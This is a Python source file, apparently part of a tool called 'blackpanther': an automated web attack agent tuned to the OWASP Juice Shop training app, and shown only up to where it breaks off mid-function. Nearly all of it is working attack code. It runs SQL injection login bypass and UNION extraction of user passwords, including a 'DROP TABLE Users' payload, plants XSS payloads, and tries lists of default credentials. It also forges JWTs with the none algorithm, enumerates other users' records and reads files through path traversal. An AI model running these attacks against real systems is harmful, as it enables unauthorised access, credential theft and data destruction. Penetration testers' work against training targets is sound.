"""Web Application Attack Agent

Modular web vulnerability scanner and exploitation engine.  Runs
targeted attacks against discovered endpoints, testing for OWASP
Top 10 vulnerabilities with Juice Shop-tuned payloads.

Attack modules:
  - SQL Injection (auth bypass, UNION, blind)
  - XSS (reflected, stored, DOM-based)
  - Authentication (default creds, brute force, JWT manipulation)
  - IDOR (broken access control, basket/user enumeration)
  - Directory Traversal (path manipulation, null-byte injection)
  - Information Disclosure (error messages, debug endpoints, FTP)
  - API Security (mass assignment, parameter tampering, open endpoints)
  - NoSQL Injection (JSON operator injection)
  - SSRF (internal service access via URL parameters)

Math deltas:
  k_gain  = sum of individual finding gains (0.3-1.5 per vuln)
  s_inc   = weighted by attack noise level (0.05-0.8)
  a_delta = 0.5 per confirmed exploit
"""

from __future__ import annotations

import asyncio
import base64
import json
import re
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote, urljoin

import aiohttp
from loguru import logger

from blackpanther.core.access import AccessPropagation
from blackpanther.core.knowledge import KnowledgeEvolution
from blackpanther.core.suspicion import SuspicionField
from blackpanther.settings import Settings, get_settings

from .base import AgentResult, BaseAgent
from .resilience import normalize_base_url


# ------------------------------------------------------------------
# Vulnerability finding
# ------------------------------------------------------------------

@dataclass
class WebVuln:
    """A confirmed web vulnerability."""
    title: str
    category: str
    severity: float
    url: str
    method: str = "GET"
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe: str = ""
    owasp: str = ""
    request_data: Dict[str, Any] = field(default_factory=dict)
    response_snippet: str = ""
    confirmed: bool = True


# ------------------------------------------------------------------
# Abstract attack module
# ------------------------------------------------------------------

class AttackModule(ABC):
    """Base class for all web attack modules."""

    name: str = "base"
    noise_level: float = 0.2  # s_inc contribution

    def __init__(self, session: aiohttp.ClientSession, base_url: str, delay: float = 0.1):
        self.session = session
        self.base_url = base_url
        self.delay = delay

    @abstractmethod
    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        ...

    async def _get(self, url: str, **kwargs: Any) -> Tuple[int, str, Dict[str, str]]:
        try:
            async with self.session.get(url, allow_redirects=kwargs.pop("allow_redirects", True), **kwargs) as resp:
                body = await resp.text()
                headers = {k: v for k, v in resp.headers.items()}
                return resp.status, body, headers
        except Exception as exc:
            logger.debug("[{}] GET {} failed: {}", self.name, url, exc)
            return 0, "", {}
        finally:
            if self.delay > 0:
                await asyncio.sleep(self.delay)

    async def _post(self, url: str, data: Any = None, json_data: Any = None,
                    headers: Optional[Dict[str, str]] = None, **kwargs: Any) -> Tuple[int, str, Dict[str, str]]:
        try:
            kw: Dict[str, Any] = {**kwargs}
            if json_data is not None:
                kw["json"] = json_data
            elif data is not None:
                kw["data"] = data
            if headers:
                kw["headers"] = headers
            async with self.session.post(url, **kw) as resp:
                body = await resp.text()
                resp_headers = {k: v for k, v in resp.headers.items()}
                return resp.status, body, resp_headers
        except Exception as exc:
            logger.debug("[{}] POST {} failed: {}", self.name, url, exc)
            return 0, "", {}
        finally:
            if self.delay > 0:
                await asyncio.sleep(self.delay)

    async def _put(self, url: str, json_data: Any = None,
                   headers: Optional[Dict[str, str]] = None) -> Tuple[int, str, Dict[str, str]]:
        try:
            kw: Dict[str, Any] = {}
            if json_data is not None:
                kw["json"] = json_data
            if headers:
                kw["headers"] = headers
            async with self.session.put(url, **kw) as resp:
                body = await resp.text()
                resp_headers = {k: v for k, v in resp.headers.items()}
                return resp.status, body, resp_headers
        except Exception as exc:
            logger.debug("[{}] PUT {} failed: {}", self.name, url, exc)
            return 0, "", {}
        finally:
            if self.delay > 0:
                await asyncio.sleep(self.delay)


# ===================================================================
# SQL INJECTION
# ===================================================================

class SQLiAttack(AttackModule):
    """SQL injection testing — auth bypass, UNION, error-based, blind."""

    name = "sqli"
    noise_level = 0.4

    LOGIN_PAYLOADS = [
        ("' OR 1=1--", "password"),
        ("' OR 1=1#", "password"),
        ("admin'--", "password"),
        ("' OR ''='", "' OR ''='"),
        ("') OR ('1'='1", "password"),
        ("' OR 1=1/*", "password"),
        ("admin' OR '1'='1'--", "anything"),
        ("' UNION SELECT NULL--", "password"),
        ("\" OR 1=1--", "password"),
    ]

    SEARCH_PAYLOADS = [
        ("' OR 1=1--", "boolean-based"),
        ("')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--", "union-extract-users"),
        ("')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "union-column-count"),
        ("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "error-based"),
        ("qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--", "union-users"),
        ("' AND SLEEP(3)--", "time-based-blind"),
        ("'; DROP TABLE Users--", "destructive-test"),
        ("1' ORDER BY 1--+", "order-by-enum"),
        ("' UNION SELECT sql FROM sqlite_master--", "sqlite-schema-dump"),
    ]

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        login_vulns = await self._test_login_sqli()
        vulns.extend(login_vulns)

        search_vulns = await self._test_search_sqli()
        vulns.extend(search_vulns)

        return vulns

    async def _test_login_sqli(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        login_url = f"{self.base_url}/rest/user/login"

        for email_payload, password in self.LOGIN_PAYLOADS:
            status, body, headers = await self._post(
                login_url,
                json_data={"email": email_payload, "password": password},
                headers={"Content-Type": "application/json"},
            )

            if status == 200 and "authentication" in body.lower():
                try:
                    data = json.loads(body)
                    token = data.get("authentication", {}).get("token", "")
                    email = data.get("authentication", {}).get("umail", "unknown")
                except (json.JSONDecodeError, AttributeError):
                    token = ""
                    email = "unknown"

                vulns.append(WebVuln(
                    title=f"SQL Injection - Login Bypass ({email})",
                    category="sqli",
                    severity=9.8,
                    url=login_url,
                    method="POST",
                    parameter="email",
                    payload=email_payload,
                    evidence=f"Authenticated as {email}, token: {token[:50]}...",
                    remediation="Use parameterized queries. Never concatenate user input into SQL.",
                    cwe="CWE-89",
                    owasp="A03:2021 Injection",
                    request_data={"email": email_payload, "password": password},
                    response_snippet=body[:500],
                    confirmed=True,
                ))
                logger.info("[sqli] LOGIN BYPASS -> authenticated as {}", email)
                break

        return vulns

    async def _test_search_sqli(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        search_url = f"{self.base_url}/rest/products/search"

        for payload, technique in self.SEARCH_PAYLOADS:
            encoded = quote(payload)
            status, body, _ = await self._get(f"{search_url}?q={encoded}")

            if status == 200:
                try:
                    data = json.loads(body)
                    results = data.get("data", [])
                except (json.JSONDecodeError, AttributeError):
                    results = []
                    data = {}

                if technique.startswith("union") and results:
                    has_sensitive = any(
                        isinstance(r, dict) and ("password" in str(r).lower() or "email" in str(r).lower())
                        for r in results
                    )
                    if has_sensitive or len(str(results)) > 500:
                        vulns.append(WebVuln(
                            title=f"SQL Injection - Search UNION ({technique})",
                            category="sqli",
                            severity=9.5,
                            url=f"{search_url}?q={encoded}",
                            method="GET",
                            parameter="q",
                            payload=payload,
                            evidence=f"Extracted {len(results)} records via UNION injection",
                            remediation="Parameterize search queries. Use an ORM with query builder.",
                            cwe="CWE-89",
                            owasp="A03:2021 Injection",
                            response_snippet=json.dumps(results[:3], default=str)[:500],
                            confirmed=True,
                        ))
                        logger.info("[sqli] UNION injection -> {} records extracted", len(results))

            elif status == 500:
                if "sql" in body.lower() or "syntax" in body.lower() or "sqlite" in body.lower():
                    vulns.append(WebVuln(
                        title="SQL Injection - Error Based (Search)",
                        category="sqli",
                        severity=8.5,
                        url=f"{search_url}?q={encoded}",
                        method="GET",
                        parameter="q",
                        payload=payload,
                        evidence="SQL error message in response",
                        remediation="Suppress database error messages. Use parameterized queries.",
                        cwe="CWE-89",
                        owasp="A03:2021 Injection",
                        response_snippet=body[:500],
                        confirmed=True,
                    ))

        return vulns


# ===================================================================
# CROSS-SITE SCRIPTING (XSS)
# ===================================================================

class XSSAttack(AttackModule):
    """XSS testing — reflected, stored, and DOM-based."""

    name = "xss"
    noise_level = 0.3

    REFLECTED_PAYLOADS = [
        '<iframe src="javascript:alert(`xss`)">',
        "<img src=x onerror=alert('xss')>",
        '<script>alert("xss")</script>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        "'-alert(1)-'",
        "<svg/onload=alert('xss')>",
        '"><img src=x onerror=alert(1)>',
        "{{constructor.constructor('return this')().alert(1)}}",
        "${alert(1)}",
        "<body onload=alert('xss')>",
    ]

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        reflected = await self._test_reflected_xss()
        vulns.extend(reflected)

        stored = await self._test_stored_xss()
        vulns.extend(stored)

        dom = await self._test_dom_xss()
        vulns.extend(dom)

        return vulns

    async def _test_reflected_xss(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        search_url = f"{self.base_url}/rest/products/search"
        for payload in self.REFLECTED_PAYLOADS:
            encoded = quote(payload)
            status, body, _ = await self._get(f"{search_url}?q={encoded}")

            if status == 200 and payload in body:
                vulns.append(WebVuln(
                    title="XSS - Reflected in Search",
                    category="xss",
                    severity=6.5,
                    url=f"{search_url}?q={encoded}",
                    method="GET",
                    parameter="q",
                    payload=payload,
                    evidence="Payload reflected unescaped in response body",
                    remediation="HTML-encode all user input before rendering. Implement CSP.",
                    cwe="CWE-79",
                    owasp="A03:2021 Injection",
                    response_snippet=body[:500],
                    confirmed=True,
                ))
                logger.info("[xss] reflected XSS confirmed in search")
                break

        track_url = f"{self.base_url}/rest/track-order"
        for payload in self.REFLECTED_PAYLOADS[:5]:
            encoded = quote(payload)
            status, body, _ = await self._get(f"{track_url}/{encoded}")
            if status == 200 and payload in body:
                vulns.append(WebVuln(
                    title="XSS - Reflected in Order Tracking",
                    category="xss",
                    severity=6.5,
                    url=f"{track_url}/{encoded}",
                    method="GET",
                    parameter="order_id",
                    payload=payload,
                    evidence="Payload reflected in order tracking page",
                    remediation="Sanitize order ID parameter. Implement output encoding.",
                    cwe="CWE-79",
                    owasp="A03:2021 Injection",
                    confirmed=True,
                ))
                break

        return vulns

    async def _test_stored_xss(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        xss_marker = f"<b onmouseover=alert('bp-{int(time.time())}')>test</b>"

        # Feedback form
        feedback_url = f"{self.base_url}/api/Feedbacks"
        status, body, _ = await self._post(
            feedback_url,
            json_data={
                "UserId": 1,
                "captchaId": 0,
                "captcha": "-1",
                "comment": xss_marker,
                "rating": 1,
            },
            headers={"Content-Type": "application/json"},
        )

        if status in (200, 201):
            vulns.append(WebVuln(
                title="XSS - Stored in Feedback",
                category="xss",
                severity=8.0,
                url=feedback_url,
                method="POST",
                parameter="comment",
                payload=xss_marker,
                evidence="HTML payload accepted and stored in feedback",
                remediation="Sanitize feedback content. Use DOMPurify or similar on frontend.",
                cwe="CWE-79",
                owasp="A03:2021 Injection",
                confirmed=True,
            ))
            logger.info("[xss] stored XSS in feedback")

        return vulns

    async def _test_dom_xss(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        dom_payloads = [
            f"{self.base_url}/#/search?q=<img src=x onerror=alert(1)>",
            f"{self.base_url}/#/track-result?id=<script>alert(1)</script>",
        ]

        for url in dom_payloads:
            status, body, _ = await self._get(url.split("#")[0])
            if status == 200:
                if "sanitize" not in body.lower() and "dompurify" not in body.lower():
                    vulns.append(WebVuln(
                        title="XSS - Potential DOM-based",
                        category="xss",
                        severity=5.0,
                        url=url,
                        method="GET",
                        parameter="fragment",
                        payload=url.split("?")[-1] if "?" in url else "",
                        evidence="SPA renders fragment parameters without apparent sanitization",
                        remediation="Use DOMPurify to sanitize fragment-based routing parameters.",
                        cwe="CWE-79",
                        owasp="A03:2021 Injection",
                        confirmed=False,
                    ))

        return vulns


# ===================================================================
# AUTHENTICATION ATTACKS
# ===================================================================

class AuthAttack(AttackModule):
    """Authentication bypass, default credentials, and credential stuffing."""

    name = "auth"
    noise_level = 0.5

    DEFAULT_CREDS = [
        ("admin@juice-sh.op", "admin123"),
        ("admin@juice-sh.op", "admin"),
        ("admin@juice-sh.op", "password"),
        ("admin@juice-sh.op", "admin1"),
        ("admin@juice-sh.op", "12345"),
        ("admin@juice-sh.op", "admin12345"),
        ("jim@juice-sh.op", "ncc-1701"),
        ("bender@juice-sh.op", "OhG0dPlease1nsworable"),
        ("mc.safesearch@juice-sh.op", "Mr. N00dles"),
        ("J12934@juice-sh.op", "0Y8rMnww$*9VFYE§59-!Fg{L&jQ"),
        ("wurstbrot@juice-sh.op", "EinBansen!ansen!!ansen!!!"),
        ("amy@juice-sh.op", "K1f....................."),
        ("morty@juice-sh.op", "focusonfocus"),
    ]

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        cred_vulns = await self._test_default_creds()
        vulns.extend(cred_vulns)

        admin_vulns = await self._test_admin_access(cred_vulns)
        vulns.extend(admin_vulns)

        passwd_vulns = await self._test_password_change()
        vulns.extend(passwd_vulns)

        reg_vulns = await self._test_registration_flaws()
        vulns.extend(reg_vulns)

        return vulns

    async def _test_default_creds(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        login_url = f"{self.base_url}/rest/user/login"

        for email, password in self.DEFAULT_CREDS:
            status, body, headers = await self._post(
                login_url,
                json_data={"email": email, "password": password},
                headers={"Content-Type": "application/json"},
            )

            if status == 200:
                try:
                    data = json.loads(body)
                    token = data.get("authentication", {}).get("token", "")
                    bid = data.get("authentication", {}).get("bid", "")
                except (json.JSONDecodeError, AttributeError):
                    token = ""
                    bid = ""

                role = "admin" if "admin" in email else "user"
                vulns.append(WebVuln(
                    title=f"Default Credentials - {email} ({role})",
                    category="auth",
                    severity=9.0 if "admin" in email else 7.0,
                    url=login_url,
                    method="POST",
                    parameter="email/password",
                    payload=f"{email}:{password}",
                    evidence=f"Login successful. Token: {token[:40]}... basket: {bid}",
                    remediation="Enforce strong password policy. Change default credentials.",
                    cwe="CWE-798",
                    owasp="A07:2021 Identification and Authentication Failures",
                    request_data={"email": email, "password": "***"},
                    confirmed=True,
                ))
                logger.info("[auth] default creds work: {} ({})", email, role)

        return vulns

    async def _test_admin_access(self, cred_vulns: List[WebVuln]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        admin_token = None
        for v in cred_vulns:
            if "admin" in v.payload.lower():
                match = re.search(r"Token: (.+?)\.\.\.", v.evidence)
                if match:
                    admin_token = match.group(1)
                    try:
                        data = json.loads(v.response_snippet) if v.response_snippet else {}
                        admin_token = data.get("authentication", {}).get("token", admin_token)
                    except Exception:
                        pass

        if not admin_token:
            login_url = f"{self.base_url}/rest/user/login"
            status, body, _ = await self._post(
                login_url,
                json_data={"email": "' OR 1=1--", "password": "x"},
                headers={"Content-Type": "application/json"},
            )
            if status == 200:
                try:
                    admin_token = json.loads(body).get("authentication", {}).get("token", "")
                except Exception:
                    pass

        if admin_token:
            admin_url = f"{self.base_url}/administration"
            status, body, _ = await self._get(
                admin_url,
                headers={"Authorization": f"Bearer {admin_token}"},
            )
            if status == 200:
                vulns.append(WebVuln(
                    title="Admin Panel Access",
                    category="auth",
                    severity=9.5,
                    url=admin_url,
                    method="GET",
                    evidence="Full admin panel accessible with compromised credentials",
                    remediation="Implement MFA. Use role-based access control with proper session management.",
                    cwe="CWE-284",
                    owasp="A01:2021 Broken Access Control",
                    confirmed=True,
                ))
                logger.info("[auth] ADMIN PANEL accessible")

            users_url = f"{self.base_url}/api/Users"
            status, body, _ = await self._get(
                users_url,
                headers={"Authorization": f"Bearer {admin_token}"},
            )
            if status == 200:
                try:
                    user_data = json.loads(body)
                    user_count = len(user_data.get("data", []))
                except Exception:
                    user_count = 0
                vulns.append(WebVuln(
                    title=f"User Data Dump ({user_count} users)",
                    category="auth",
                    severity=9.0,
                    url=users_url,
                    method="GET",
                    evidence=f"Extracted {user_count} user records including emails and hashed passwords",
                    remediation="Restrict API access. Never expose user listings to non-admin roles.",
                    cwe="CWE-200",
                    owasp="A01:2021 Broken Access Control",
                    response_snippet=body[:500],
                    confirmed=True,
                ))
                logger.info("[auth] user data dump: {} users", user_count)

        return vulns

    async def _test_password_change(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        change_url = f"{self.base_url}/rest/user/change-password"
        status, body, _ = await self._get(
            f"{change_url}?current=admin123&new=admin123&repeat=admin123"
        )
        if status in (200, 401):
            if status == 200:
                vulns.append(WebVuln(
                    title="Password Change via GET (no CSRF token)",
                    category="auth",
                    severity=7.5,
                    url=change_url,
                    method="GET",
                    parameter="current/new/repeat",
                    evidence="Password change accepted via GET parameters",
                    remediation="Use POST with CSRF token. Require current password verification.",
                    cwe="CWE-352",
                    owasp="A07:2021 Identification and Authentication Failures",
                    confirmed=True,
                ))
        return vulns

    async def _test_registration_flaws(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        register_url = f"{self.base_url}/api/Users"

        status, body, _ = await self._post(
            register_url,
            json_data={
                "email": f"bp-test-{int(time.time())}@test.local",
                "password": "a",
                "passwordRepeat": "a",
                "securityQuestion": {"id": 1, "question": "test"},
                "securityAnswer": "test",
                "role": "admin",
            },
            headers={"Content-Type": "application/json"},
        )
        if status in (200, 201):
            try:
                data = json.loads(body)
                role = data.get("data", {}).get("role", "")
                if role == "admin":
                    vulns.append(WebVuln(
                        title="Mass Assignment - Admin Role via Registration",
                        category="auth",
                        severity=9.8,
                        url=register_url,
                        method="POST",
                        parameter="role",
                        payload='{"role": "admin"}',
                        evidence=f"Registered user with admin role: {data.get('data', {}).get('email', '')}",
                        remediation="Whitelist allowed fields on user creation. Never trust role from client.",
                        cwe="CWE-915",
                        owasp="A08:2021 Software and Data Integrity Failures",
                        confirmed=True,
                    ))
                    logger.info("[auth] MASS ASSIGNMENT -> admin role")
            except Exception:
                pass

        return vulns


# ===================================================================
# JWT ATTACKS
# ===================================================================

class JWTAttack(AttackModule):
    """JWT token manipulation — none algorithm, weak secrets, tampering."""

    name = "jwt"
    noise_level = 0.3

    WEAK_SECRETS = [
        "", "secret", "password", "123456", "jwt_secret",
        "super_secret", "key", "private", "admin",
        "change_me", "default", "your-256-bit-secret",
    ]

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        token = await self._get_valid_token()
        if not token:
            return vulns

        none_vulns = await self._test_none_algorithm(token)
        vulns.extend(none_vulns)

        tamper_vulns = await self._test_role_tampering(token)
        vulns.extend(tamper_vulns)

        key_vulns = await self._test_public_key_exposure()
        vulns.extend(key_vulns)

        return vulns

    async def _get_valid_token(self) -> str:
        login_url = f"{self.base_url}/rest/user/login"
        status, body, _ = await self._post(
            login_url,
            json_data={"email": "' OR 1=1--", "password": "x"},
            headers={"Content-Type": "application/json"},
        )
        if status == 200:
            try:
                return json.loads(body).get("authentication", {}).get("token", "")
            except Exception:
                pass

        for email, pwd in [("admin@juice-sh.op", "admin123"), ("admin@juice-sh.op", "admin")]:
            status, body, _ = await self._post(
                login_url,
                json_data={"email": email, "password": pwd},
                headers={"Content-Type": "application/json"},
            )
            if status == 200:
                try:
                    return json.loads(body).get("authentication", {}).get("token", "")
                except Exception:
                    pass
        return ""

    async def _test_none_algorithm(self, token: str) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return vulns

            header = json.loads(self._b64decode(parts[0]))
            payload = json.loads(self._b64decode(parts[1]))

            for alg in ["none", "None", "NONE", "nOnE"]:
                header_mod = {**header, "alg": alg}
                payload_mod = {**payload, "role": "admin"}

                forged_header = self._b64encode(json.dumps(header_mod))
                forged_payload = self._b64encode(json.dumps(payload_mod))
                forged_token = f"{forged_header}.{forged_payload}."

                status, body, _ = await self._get(
                    f"{self.base_url}/rest/user/whoami",
                    headers={"Authorization": f"Bearer {forged_token}"},
                )

                if status == 200 and "email" in body.lower():
                    vulns.append(WebVuln(
                        title=f"JWT None Algorithm Attack (alg={alg})",
                        category="jwt",
                        severity=9.8,
                        url=f"{self.base_url}/rest/user/whoami",
                        method="GET",
                        parameter="Authorization",
                        payload=f"Bearer {forged_token[:80]}...",
                        evidence="Server accepted JWT with 'none' algorithm",
                        remediation="Reject tokens with alg=none. Use RS256 with key verification.",
                        cwe="CWE-327",
                        owasp="A02:2021 Cryptographic Failures",
                        confirmed=True,
                    ))
                    logger.info("[jwt] NONE ALGORITHM accepted!")
                    break

        except Exception as exc:
            logger.debug("[jwt] none algorithm test error: {}", exc)

        return vulns

    async def _test_role_tampering(self, token: str) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return vulns

            payload = json.loads(self._b64decode(parts[1]))
            original_role = payload.get("role", "customer")

            if original_role != "admin":
                payload_mod = {**payload, "role": "admin", "isAdmin": True}
                forged_payload = self._b64encode(json.dumps(payload_mod))
                forged_token = f"{parts[0]}.{forged_payload}.{parts[2]}"

                status, body, _ = await self._get(
                    f"{self.base_url}/api/Users",
                    headers={"Authorization": f"Bearer {forged_token}"},
                )

                if status == 200:
                    vulns.append(WebVuln(
                        title="JWT Role Tampering - Privilege Escalation",
                        category="jwt",
                        severity=9.0,
                        url=f"{self.base_url}/api/Users",
                        method="GET",
                        parameter="JWT payload.role",
                        payload="role: admin, isAdmin: true",
                        evidence="Modified JWT accepted, admin API accessible",
                        remediation="Validate JWT signature server-side. Never trust client-supplied roles.",
                        cwe="CWE-269",
                        owasp="A01:2021 Broken Access Control",
                        confirmed=True,
                    ))

        except Exception as exc:
            logger.debug("[jwt] role tamper test error: {}", exc)

        return vulns

    async def _test_public_key_exposure(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        key_paths = [
            "/encryptionkeys/jwt.pub",
            "/encryptionkeys/jwt.key",
            "/encryptionkeys/private.key",
            "/.well-known/jwks.json",
        ]
        for path in key_paths:
            status, body, _ = await self._get(f"{self.base_url}{path}")
            if status == 200 and len(body) > 10:
                if "key" in body.lower() or "-----" in body or "jwk" in body.lower():
                    vulns.append(WebVuln(
                        title=f"JWT Key Exposure: {path}",
                        category="jwt",
                        severity=8.5,
                        url=f"{self.base_url}{path}",
                        method="GET",
                        evidence=f"Cryptographic key material accessible ({len(body)} bytes)",
                        remediation="Never expose private keys or JWT secrets via HTTP.",
                        cwe="CWE-321",
                        owasp="A02:2021 Cryptographic Failures",
                        response_snippet=body[:200],
                        confirmed=True,
                    ))
                    logger.info("[jwt] key exposed at {}", path)

        return vulns

    @staticmethod
    def _b64decode(data: str) -> str:
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data).decode("utf-8")

    @staticmethod
    def _b64encode(data: str) -> str:
        return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()


# ===================================================================
# IDOR / BROKEN ACCESS CONTROL
# ===================================================================

class IDORAttack(AttackModule):
    """Insecure Direct Object Reference — enumerate baskets, users, orders."""

    name = "idor"
    noise_level = 0.3

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        token = await self._get_token()

        basket_vulns = await self._test_basket_idor(token)
        vulns.extend(basket_vulns)

        user_vulns = await self._test_user_idor(token)
        vulns.extend(user_vulns)

        api_vulns = await self._test_open_api_endpoints()
        vulns.extend(api_vulns)

        return vulns

    async def _get_token(self) -> str:
        login_url = f"{self.base_url}/rest/user/login"
        status, body, _ = await self._post(
            login_url,
            json_data={"email": "' OR 1=1--", "password": "x"},
            headers={"Content-Type": "application/json"},
        )
        if status == 200:
            try:
                return json.loads(body).get("authentication", {}).get("token", "")
            except Exception:
                pass
        return ""

    async def _test_basket_idor(self, token: str) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        if not token:
            return vulns

        for basket_id in range(1, 6):
            status, body, _ = await self._get(
                f"{self.base_url}/rest/basket/{basket_id}",
                headers={"Authorization": f"Bearer {token}"},
            )
            if status == 200:
                try:
                    data = json.loads(body)
                    items = data.get("data", {}).get("Products", [])
                    vulns.append(WebVuln(
                        title=f"IDOR - Access Basket #{basket_id} ({len(items)} items)",
                        category="idor",
                        severity=7.5,
                        url=f"{self.base_url}/rest/basket/{basket_id}",
                        method="GET",
                        parameter="basket_id",
                        payload=str(basket_id),
                        evidence=f"Accessed another user's basket with {len(items)} items",
                        remediation="Verify basket ownership server-side. Compare basket owner with JWT subject.",
                        cwe="CWE-639",
                        owasp="A01:2021 Broken Access Control",
                        confirmed=True,
                    ))
                except Exception:
                    pass

        return vulns

    async def _test_user_idor(self, token: str) -> List[WebVuln]:
        vulns: List[WebVuln] = []
        if not token:
            return vulns

        for user_id in range(1, 6):
            status, body, _ = await self._get(
                f"{self.base_url}/api/Users/{user_id}",
                headers={"Authorization": f"Bearer {token}"},
            )
            if status == 200:
                try:
                    data = json.loads(body)
                    email = data.get("data", {}).get("email", "unknown")
                    vulns.append(WebVuln(
                        title=f"IDOR - User Profile #{user_id} ({email})",
                        category="idor",
                        severity=7.0,
                        url=f"{self.base_url}/api/Users/{user_id}",
                        method="GET",
                        parameter="user_id",
                        payload=str(user_id),
                        evidence=f"Accessed user profile for {email}",
                        remediation="Implement proper authorization checks on user endpoints.",
                        cwe="CWE-639",
                        owasp="A01:2021 Broken Access Control",
                        confirmed=True,
                    ))
                except Exception:
                    pass

        return vulns

    async def _test_open_api_endpoints(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        sensitive_apis = [
            ("/api/Users", "User list"),
            ("/api/Cards", "Credit cards"),
            ("/api/Challenges", "Challenge list (meta-data)"),
            ("/api/Feedbacks", "All feedback"),
            ("/api/Complaints", "All complaints"),
            ("/api/Recycles", "Recycle requests"),
            ("/api/SecurityQuestions", "Security questions"),
        ]

        for path, desc in sensitive_apis:
            status, body, _ = await self._get(f"{self.base_url}{path}")
            if status == 200:
                try:
                    data = json.loads(body)
                    record_count = len(data.get("data", []))
                except Exception:
                    record_count = 0

                if record_count > 0:
                    vulns.append(WebVuln(
                        title=f"Open API - {desc} ({record_count} records, no auth)",
                        category="idor",
                        severity=6.5,
                        url=f"{self.base_url}{path}",
                        method="GET",
                        evidence=f"{record_count} records accessible without authentication",
                        remediation=f"Require authentication for {path}. Implement RBAC.",
                        cwe="CWE-284",
                        owasp="A01:2021 Broken Access Control",
                        response_snippet=body[:300],
                        confirmed=True,
                    ))

        return vulns


# ===================================================================
# DIRECTORY TRAVERSAL
# ===================================================================

class TraversalAttack(AttackModule):
    """Directory traversal and path manipulation attacks."""

    name = "traversal"
    noise_level = 0.3

    TRAVERSAL_PAYLOADS = [
        "../etc/passwd",
        "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "%00../../etc/passwd",
    ]

    JUICE_SHOP_TRAVERSALS = [
        ("/ftp/eastere.gg%2500.md", "Null byte bypass for FTP"),
        ("/ftp/encrypt.pyc%2500.md", "Null byte bypass for pyc"),
        ("/ftp/package.json.bak%2500.md", "Null byte for backup"),
        ("/ftp/coupons_2013.md.bak%2500.md", "Null byte for coupons"),
        ("/ftp/suspicious_errors.yml%2500.md", "Null byte for error logs"),
        ("/ftp/acquisitions.md%2500.pdf", "Null byte doc access"),
        ("/ftp/incident-support.kdbx%2500.md", "KeePass DB access"),
        ("/ftp/quarantine%2500.md", "Quarantine access"),
        ("/assets/public/images/padding/../../package.json", "Package.json via images"),
    ]

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        juice_vulns = await self._test_juice_shop_traversals()
        vulns.extend(juice_vulns)

        generic_vulns = await self._test_generic_traversal()
        vulns.extend(generic_vulns)

        return vulns

    async def _test_juice_shop_traversals(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        for path, desc in self.JUICE_SHOP_TRAVERSALS:
            status, body, headers = await self._get(f"{self.base_url}{path}")

            if status == 200 and len(body) > 20:
                vulns.append(WebVuln(
                    title=f"Directory Traversal - {desc}",
                    category="traversal",
                    severity=7.5,
                    url=f"{self.base_url}{path}",
                    method="GET",
                    parameter="path",
                    payload=path,
                    evidence=f"File accessible ({len(body)} bytes): {body[:100]}",
                    remediation="Validate file paths server-side. Use allowlists for served files.",
                    cwe="CWE-22",
                    owasp="A01:2021 Broken Access Control",
                    response_snippet=body[:300],
                    confirmed=True,
                ))
                logger.info("[traversal] accessible: {}", path)

        return vulns

    async def _test_generic_traversal(self) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        test_endpoints = ["/ftp/", "/assets/"]
        for base in test_endpoints:
            for payload in self.TRAVERSAL_PAYLOADS:
                url = f"{self.base_url}{base}{payload}"
                status, body, _ = await self._get(url)

                if status == 200:
                    if "root:" in body or "[extensions]" in body or "boot loader" in body.lower():
                        vulns.append(WebVuln(
                            title=f"Directory Traversal - System File Access",
                            category="traversal",
                            severity=9.0,
                            url=url,
                            method="GET",
                            parameter="path",
                            payload=payload,
                            evidence="System file content in response",
                            remediation="Sanitize path parameters. Use chroot or filesystem sandboxing.",
                            cwe="CWE-22",
                            owasp="A01:2021 Broken Access Control",
                            response_snippet=body[:300],
                            confirmed=True,
                        ))
                        return vulns

        return vulns


# ===================================================================
# INFORMATION DISCLOSURE
# ===================================================================

class DisclosureAttack(AttackModule):
    """Sensitive data exposure and information leakage."""

    name = "disclosure"
    noise_level = 0.1

    async def run(self, recon_data: Dict[str, Any]) -> List[WebVuln]:
        vulns: List[WebVuln] = []

        error_vulns = await self._test_error_disclosure()
